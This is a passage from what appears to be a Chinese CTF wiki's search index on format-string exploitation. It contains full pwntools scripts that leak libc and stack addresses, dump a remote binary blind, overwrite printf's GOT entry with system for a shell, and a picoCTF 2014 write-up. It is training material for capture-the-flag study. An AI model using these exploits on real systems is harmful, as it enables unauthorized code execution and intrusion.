            "text": "from   pwn   import   *  from   LibcSearcher   import   *  contact   =   ELF ( ./contacts )  ##context.log_level =  debug  if   args [ REMOTE ]: \n     sh   =   remote ( 11 ,   111 )  else : \n     sh   =   process ( ./contacts )  def   createcontact ( name ,   phone ,   descrip_len ,   description ): \n     sh . recvuntil (   ) \n     sh . sendline ( 1 ) \n     sh . recvuntil ( Contact info:  \\n ) \n     sh . recvuntil ( Name:  ) \n     sh . sendline ( name ) \n     sh . recvuntil ( You have 10 numbers \\n ) \n     sh . sendline ( phone ) \n     sh . recvuntil ( Length of description:  ) \n     sh . sendline ( descrip_len ) \n     sh . recvuntil ( description: \\n\\t\\t ) \n     sh . sendline ( description )  def   printcontact (): \n     sh . recvuntil (   ) \n     sh . sendline ( 4 ) \n     sh . recvuntil ( Contacts: ) \n     sh . recvuntil ( Description:  )  ## get system addr   binsh_addr  payload   =   %31$paaaa  createcontact ( 1111 ,   1111 ,   111 ,   payload )  printcontact ()  libc_start_main_ret   =   int ( sh . recvuntil ( aaaa ,   drop = True ),   16 )  log . success ( get libc_start_main_ret addr:    +   hex ( libc_start_main_ret ))  libc   =   LibcSearcher ( __libc_start_main_ret ,   libc_start_main_ret )  libc_base   =   libc_start_main_ret   -   libc . dump ( __libc_start_main_ret )  system_addr   =   libc_base   +   libc . dump ( system )  binsh_addr   =   libc_base   +   libc . dump ( str_bin_sh )  log . success ( get system addr:    +   hex ( system_addr ))  log . success ( get binsh addr:    +   hex ( binsh_addr ))  ##gdb.attach(sh)  ## get heap addr and ebp addr  payload   =   flat ([ \n     system_addr , \n     bbbb , \n     binsh_addr , \n     %6$p%11$pcccc ,  ])  createcontact ( 2222 ,   2222 ,   222 ,   payload )  printcontact ()  sh . recvuntil ( Description:  )  data   =   sh . recvuntil ( cccc ,   drop = True )  data   =   data . split ( 0x )  print   data  ebp_addr   =   int ( data [ 1 ],   16 )  heap_addr   =   int ( data [ 2 ],   16 )  ## modify ebp  part1   =   ( heap_addr   -   4 )   /   2  part2   =   heap_addr   -   4   -   part1  payload   =   %   +   str ( part1 )   +   x%   +   str ( part2 )   +   x%6$n  ##print payload  createcontact ( 3333 ,   123456789 ,   300 ,   payload )  printcontact ()  sh . recvuntil ( Description:  )  sh . recvuntil ( Description:  )  ##gdb.attach(sh)  print   get shell  sh . recvuntil (   )  ##get shell  sh . sendline ( 5 )  sh . interactive ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_31", 
            "text": "", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_32", 
            "text": "\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684ip\u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884cpwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548cBROP\u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7BROP\u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c   \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570  \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e   \u5229\u7528   \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#1-", 
            "text": "\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939fmt_blind_stack\u4e2d\u3002", 
            "title": "\u4f8b\u5b501-\u6cc4\u9732\u6808"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_33", 
            "text": "\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86%p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f  \u279c  blind_fmt_stack git: ( master )  \u2717 nc localhost  9999 \n%p\n0x7ffd4799beb0\nG\ufffdflag is on the stack%                            \u544a\u8bc9\u6211\u4eecflag\u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002", 
            "title": "\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_34", 
            "text": "\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b  from   pwn   import   *  context . log_level   =   error  def   leak ( payload ): \n     sh   =   remote ( 127.0.0.1 ,   9999 ) \n     sh . sendline ( payload ) \n     data   =   sh . recvuntil ( \\n ,   drop = True ) \n     if   data . startswith ( 0x ): \n         print   p64 ( int ( data ,   16 )) \n     sh . close ()  i   =   1  while   1 : \n     payload   =   %{}$p . format ( i ) \n     leak ( payload ) \n     i   +=   1   \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230flag  ////////\n//////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff\nflag { thi\ns_is_fla\ng } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00  \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#2-got", 
            "text": "\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728blind_fmt_got\u6587\u4ef6\u5939\u4e2d\u3002", 
            "title": "\u4f8b\u5b502-\u76f2\u6253\u52ab\u6301got"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_35", 
            "text": "\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a64\u4f4d\u3002  \u279c  blind_fmt_got git: ( master )  \u2717 nc localhost  9999 \n%p\n0x7fff3b9774c0  \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002", 
            "title": "\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_36", 
            "text": "\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b  \u279c  blind_fmt_got git: ( master )  \u2717 nc localhost  9999 \naaaaaaaa%p%p%p%p%p%p%p%p%p\naaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025  \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a6\u3002", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#binary", 
            "text": "\u7531\u4e8e\u7a0b\u5e8f\u662f64\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece0x400000\u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165'\\x00'\u5b57\u7b26\u7684\uff0c\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f'\\x00'\u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f'\\x00'\u622a\u65ad\u7684\u3002\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002  ##coding=utf8  from   pwn   import   *  ##context.log_level =  debug  ip   =   127.0.0.1  port   =   9999  def   leak ( addr ): \n     # leak addr for three times \n     num   =   0 \n     while   num     3 : \n         try : \n             print   leak addr:    +   hex ( addr ) \n             sh   =   remote ( ip ,   port ) \n             payload   =   %00008$s   +   STARTEND   +   p64 ( addr ) \n             # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c \n             if   \\x0a   in   payload : \n                 return   None \n             sh . sendline ( payload ) \n             data   =   sh . recvuntil ( STARTEND ,   drop = True ) \n             sh . close () \n             return   data \n         except   Exception : \n             num   +=   1 \n             continue \n     return   None  def   getbinary (): \n     addr   =   0x400000 \n     f   =   open ( binary ,   w ) \n     while   addr     0x401000 : \n         data   =   leak ( addr ) \n         if   data   is   None : \n             f . write ( \\xff ) \n             addr   +=   1 \n         elif   len ( data )   ==   0 : \n             f . write ( \\x00 ) \n             addr   +=   1 \n         else : \n             f . write ( data ) \n             addr   +=   len ( data ) \n     f . close ()  getbinary ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728payload\u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709'\\n'\u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002", 
            "title": "\u6cc4\u9732binary"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#binary_1", 
            "text": "\u5229\u7528ida\u6253\u5f00\u6cc4\u9732\u7684binary\uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8fmain\u51fd\u6570\u7684\u5730\u5740  seg000: 00000000004005 F6                   push      rbp  seg000: 00000000004005 F7                   mov       rbp ,   rsp  seg000: 00000000004005 FA                   add       rsp ,   0 FFFFFFFFFFFFFF80h  seg000: 00000000004005 FE  seg000: 00000000004005 FE   loc_4005FE :                               ; CODE XREF: seg000:0000000000400639\u0019j  seg000 : 00000000004005 FE                   lea       rax ,   [ rbp-80h ]  seg000: 0000000000400602                   mov       edx ,   80 h   ;  \u20ac  seg000 : 0000000000400607                   mov       rsi ,   rax  seg000: 000000000040060 A                   mov       edi ,   0  seg000: 000000000040060 F                   mov       eax ,   0  seg000: 0000000000400614                   call      sub_4004C0  seg000: 0000000000400619                   lea       rax ,   [ rbp-80h ]  seg000: 000000000040061 D                   mov       rdi ,   rax  seg000: 0000000000400620                   mov       eax ,   0  seg000: 0000000000400625                   call      sub_4004B0  seg000: 000000000040062 A                   mov       rax ,   cs : 601048 h  seg000: 0000000000400631                   mov       rdi ,   rax  seg000: 0000000000400634                   call      near   ptr   unk_4004E0  seg000: 0000000000400639                   jmp       short   loc_4005FE   \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662fsub_4004C0\u4e3aread\u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662fread\u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684sub_4004B0\u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2awhile 1\u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002", 
            "title": "\u5206\u6790binary"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_37", 
            "text": "\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def   \u6cc4\u9732printf\u51fd\u6570\u7684\u5730\u5740\uff0c  \u83b7\u53d6\u5bf9\u5e94libc\u4ee5\u53casystem\u51fd\u6570\u5730\u5740  \u4fee\u6539printf\u5730\u5740\u4e3asystem\u51fd\u6570\u5730\u5740  \u8bfb\u5165/bin/sh;\u4ee5\u4fbf\u4e8e\u83b7\u53d6shell", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_38", 
            "text": "\u7a0b\u5e8f\u5982\u4e0b\u3002  ##coding=utf8  import   math  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  ##context.log_level =  debug  context . arch   =   amd64  ip   =   127.0.0.1  port   =   9999  def   leak ( addr ): \n     # leak addr for three times \n     num   =   0 \n     while   num     3 : \n         try : \n             print   leak addr:    +   hex ( addr ) \n             sh   =   remote ( ip ,   port ) \n             payload   =   %00008$s   +   STARTEND   +   p64 ( addr ) \n             # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c \n             if   \\x0a   in   payload : \n                 return   None \n             sh . sendline ( payload ) \n             data   =   sh . recvuntil ( STARTEND ,   drop = True ) \n             sh . close () \n             return   data \n         except   Exception : \n             num   +=   1 \n             continue \n     return   None  def   getbinary (): \n     addr   =   0x400000 \n     f   =   open ( binary ,   w ) \n     while   addr     0x401000 : \n         data   =   leak ( addr ) \n         if   data   is   None : \n             f . write ( \\xff ) \n             addr   +=   1 \n         elif   len ( data )   ==   0 : \n             f . write ( \\x00 ) \n             addr   +=   1 \n         else : \n             f . write ( data ) \n             addr   +=   len ( data ) \n     f . close ()  ##getbinary()  read_got   =   0x601020  printf_got   =   0x601018  sh   =   remote ( ip ,   port )  ## let the read get resolved  sh . sendline ( a )  sh . recv ()  ## get printf addr  payload   =   %00008$s   +   STARTEND   +   p64 ( read_got )  sh . sendline ( payload )  data   =   sh . recvuntil ( STARTEND ,   drop = True ) . ljust ( 8 ,   \\x00 )  sh . recv ()  read_addr   =   u64 ( data )  ## get system addr  libc   =   LibcSearcher ( read ,   read_addr )  libc_base   =   read_addr   -   libc . dump ( read )  system_addr   =   libc_base   +   libc . dump ( system )  log . success ( system addr:    +   hex ( system_addr ))  log . success ( read   addr:    +   hex ( read_addr ))  ## modify printf_got  payload   =   fmtstr_payload ( 6 ,   { printf_got :   system_addr },   0 ,   write_size = short )  ## get all the addr  addr   =   payload [: 32 ]  payload   =   %32d   +   payload [ 32 :]  offset   =   ( int )( math . ceil ( len ( payload )   /   8.0 )   +   1 )  for   i   in   range ( 6 ,   10 ): \n     old   =   %{}$ . format ( i ) \n     new   =   %{}$ . format ( offset   +   i ) \n     payload   =   payload . replace ( old ,   new )  remainer   =   len ( payload )   %   8  payload   +=   ( 8   -   remainer )   *   a  payload   +=   addr  sh . sendline ( payload )  sh . recv ()  ## get shell  sh . sendline ( /bin/sh; )  sh . interactive ()   \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801  ## modify printf_got  payload   =   fmtstr_payload ( 6 ,   { printf_got :   system_addr },   0 ,   write_size = short )  ## get all the addr  addr   =   payload [: 32 ]  payload   =   %32d   +   payload [ 32 :]  offset   =   ( int )( math . ceil ( len ( payload )   /   8.0 )   +   1 )  for   i   in   range ( 6 ,   10 ): \n     old   =   %{}$ . format ( i ) \n     new   =   %{}$ . format ( offset   +   i ) \n     payload   =   payload . replace ( old ,   new )  remainer   =   len ( payload )   %   8  payload   +=   ( 8   -   remainer )   *   a  payload   +=   addr  sh . sendline ( payload )  sh . recv ()   fmtstr_payload\u76f4\u63a5\u5f97\u5230\u7684payload\u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4printf\u7684\u65f6\u5019'\\x00'\u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools\u76ee\u524d\u6b63\u5728\u5f00\u53d1fmt_payload\u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u97628\u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9payload\u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f  offset   =   ( int )( math . ceil ( len ( payload )   /   8.0 )   +   1 )   \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e'%order$hn'\u4e2dorder\u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_detect/", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b\n\n\n\u8fd9\u91cc\u63a8\u8350\u4e00\u4e2a\u7b80\u5355\u7684\u5de5\u5177\nLazyIDA\n\u3002\u57fa\u672c\u7684\u68c0\u6d4b\u5e94\u8be5\u6ca1\u6709\u95ee\u9898\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_detect/#_1", 
            "text": "\u8fd9\u91cc\u63a8\u8350\u4e00\u4e2a\u7b80\u5355\u7684\u5de5\u5177 LazyIDA \u3002\u57fa\u672c\u7684\u68c0\u6d4b\u5e94\u8be5\u6ca1\u6709\u95ee\u9898\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/", 
            "text": "Pico CTF 2014 : Guess\n\n\n\u539f\u7406\n\n\n\u6808\u6ea2\u51fa\u3002\n\n\n\u76ee\u7684\n\n\n\u638c\u63e1PWN\u9898\u76ee\u7684\u5927\u81f4\u6d41\u7a0b\u3002\n\n\n\u73af\u5883\n\n\nUbuntu\u3002\n\n\n\u5de5\u5177\n\n\ngdb\u3001objdump\u3001python\u3002\n\n\n\u6b65\u9aa4\n\n\n\u6e90\u4ee3\u7801\u53ef\u4ee5\u4e0b\u8f7d\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0\uff1a\n\n\n#include \nstdio.h\n\n#include \nstdlib.h\n\n\nchar *flag = \n~~FLAG~~\n;\n\nvoid main(){\n    int secret, guess;\n    char name[32];\n    long seed;\n\n    FILE *f = fopen(\n/dev/urandom\n, \nrb\n);\n    fread(\nsecret, sizeof(int), 1, f);\n    fclose(f);\n\n    printf(\nHello! What is your name?\\n\n);\n    fgets(name, sizeof(name), stdin);\n\n    printf(\nWelcome to the guessing game, \n);\n    printf(name);\n    printf(\n\\nI generated a random 32-bit number.\\nYou have a 1 in 2^32 chance of guessing it. Good luck.\\n\n);\n\n    printf(\nWhat is your guess?\\n\n);\n    scanf(\n%d\n, \nguess);\n\n    if(guess == secret){\n    printf(\nWow! You guessed it!\\n\n);\n    printf(\nYour flag is: %s\\n\n, flag);\n    }else{\n    printf(\nHah! I knew you wouldn\nt get it.\\n\n);\n    }\n}\n\n\n\n\n\n\u5728\u7b2c19\u884c\u6709\u4e00\u4e2aprintf\uff08\u540d\u79f0\uff09\uff0c\u8fd9\u663e\u7136\u5bfc\u81f4\u4e00\u4e2a\u683c\u5f0f\u5b57\u7b26\u4e32\u53ef\u5229\u7528\u7684\u9519\u8bef\u3002\n\n\n\u8be5\u7a0b\u5e8f\u7684\u529f\u80fd\u975e\u5e38\u7b80\u5355\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u4ece\u4e2d\u8bfb\u53d6\u6807\u5fd7\uff0c\u7136\u540e\u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\u5b57\uff0c\u5e76\u8981\u6c42\u4f60\u7684\u540d\u5b57\u3002 \u7136\u540e\u5b83\u8981\u6c42\u4f60\u731c\u6d4b\u5b83\u4ea7\u751f\u7684\u6570\u5b57\u3002\n\n\n\u663e\u7136\u6ee5\u7528\u683c\u5f0f\u5b57\u7b26\u4e32\u9519\u8bef\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u6cc4\u6f0f\u4fe1\u606f\uff0c\u4ece\u5806\u6808\u8bfb\u53d6\u6570\u5b57\u5e76\u56de\u590d\u6b63\u786e\u7684\u7b54\u6848\uff0c\u6b64\u65f6\u6211\u4eec\u8fd4\u56de\u6807\u5fd7\u3002\n\n\n\u5728\u672c\u5730\u4f7f\u7528gdb\u7684\u673a\u5668\u4e0a\uff0c\u53ef\u4ee5\u975e\u5e38\u7cbe\u786e\u5730\u53d1\u73b0\u6570\u5b57\u5b58\u50a8\u5728\u5806\u6808\u4e2d\u7684\u4f4d\u7f6e\uff0c\u8fd9\u662f\uff0514 $ i\u3002 \u8fd9\u5e76\u4e0d\u9002\u7528\u4e8e\u771f\u6b63\u7684\u76ee\u6807\uff0c\u5f88\u53ef\u80fd\u662f\u56e0\u4e3a\u4e8c\u8fdb\u5236\u662f\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u4e0b\u7f16\u8bd1\u7684\uff0c\u4f46\u662f\u6709\u4e00\u70b9\u66b4\u529b\u7684\u5f3a\u8feb\uff0c\u6211\u6700\u7ec8\u53ef\u4ee5\u5de5\u4f5c\n\n\n$ ./guess\nHello! What is your name?\n%i %i %i %i\nWelcome to the guessing game, 32 -143569888 160419848 765327463\n\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance of guessing it. Good luck.\nWhat is your guess?\n765327463\nWow! You guessed it!\nYour flag is: xctf{xxxxx}\n\n\n\n\n\n[\u603b\u7ed3]\n\n\n\u638c\u63e1\u597d\u505aPWN\u9898\u76ee\u7684\u5927\u81f4\u601d\u8def\uff0c\u5b66\u4f1a\u5bfb\u627e\u4fee\u6539shellcode\u3002", 
            "title": "picoctf-2014 guess"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/#pico-ctf-2014-guess", 
            "text": "", 
            "title": "Pico CTF 2014 : Guess"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/#_1", 
            "text": "\u6808\u6ea2\u51fa\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/#_2", 
            "text": "\u638c\u63e1PWN\u9898\u76ee\u7684\u5927\u81f4\u6d41\u7a0b\u3002", 
            "title": "\u76ee\u7684"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/#_3", 
            "text": "Ubuntu\u3002", 
            "title": "\u73af\u5883"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/#_4", 
            "text": "gdb\u3001objdump\u3001python\u3002", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/pwn/fmtstr/example/picoctf-2014-guess/Write-up_cn/#_5", 
            "text": "\u6e90\u4ee3\u7801\u53ef\u4ee5\u4e0b\u8f7d\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0\uff1a  #include  stdio.h \n#include  stdlib.h \n\nchar *flag =  ~~FLAG~~ ;\n\nvoid main(){\n    int secret, guess;\n    char name[32];\n    long seed;\n\n    FILE *f = fopen( /dev/urandom ,  rb );\n    fread( secret, sizeof(int), 1, f);\n    fclose(f);\n\n    printf( Hello! What is your name?\\n );\n    fgets(name, sizeof(name), stdin);\n\n    printf( Welcome to the guessing game,  );\n    printf(name);\n    printf( \\nI generated a random 32-bit number.\\nYou have a 1 in 2^32 chance of guessing it. Good luck.\\n );\n\n    printf( What is your guess?\\n );\n    scanf( %d ,  guess);\n\n    if(guess == secret){\n    printf( Wow! You guessed it!\\n );\n    printf( Your flag is: %s\\n , flag);\n    }else{\n    printf( Hah! I knew you wouldn t get it.\\n );\n    }\n}  \u5728\u7b2c19\u884c\u6709\u4e00\u4e2aprintf\uff08\u540d\u79f0\uff09\uff0c\u8fd9\u663e\u7136\u5bfc\u81f4\u4e00\u4e2a\u683c\u5f0f\u5b57\u7b26\u4e32\u53ef\u5229\u7528\u7684\u9519\u8bef\u3002  \u8be5\u7a0b\u5e8f\u7684\u529f\u80fd\u975e\u5e38\u7b80\u5355\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u4ece\u4e2d\u8bfb\u53d6\u6807\u5fd7\uff0c\u7136\u540e\u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\u5b57\uff0c\u5e76\u8981\u6c42\u4f60\u7684\u540d\u5b57\u3002 \u7136\u540e\u5b83\u8981\u6c42\u4f60\u731c\u6d4b\u5b83\u4ea7\u751f\u7684\u6570\u5b57\u3002  \u663e\u7136\u6ee5\u7528\u683c\u5f0f\u5b57\u7b26\u4e32\u9519\u8bef\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u6cc4\u6f0f\u4fe1\u606f\uff0c\u4ece\u5806\u6808\u8bfb\u53d6\u6570\u5b57\u5e76\u56de\u590d\u6b63\u786e\u7684\u7b54\u6848\uff0c\u6b64\u65f6\u6211\u4eec\u8fd4\u56de\u6807\u5fd7\u3002  \u5728\u672c\u5730\u4f7f\u7528gdb\u7684\u673a\u5668\u4e0a\uff0c\u53ef\u4ee5\u975e\u5e38\u7cbe\u786e\u5730\u53d1\u73b0\u6570\u5b57\u5b58\u50a8\u5728\u5806\u6808\u4e2d\u7684\u4f4d\u7f6e\uff0c\u8fd9\u662f\uff0514 $ i\u3002 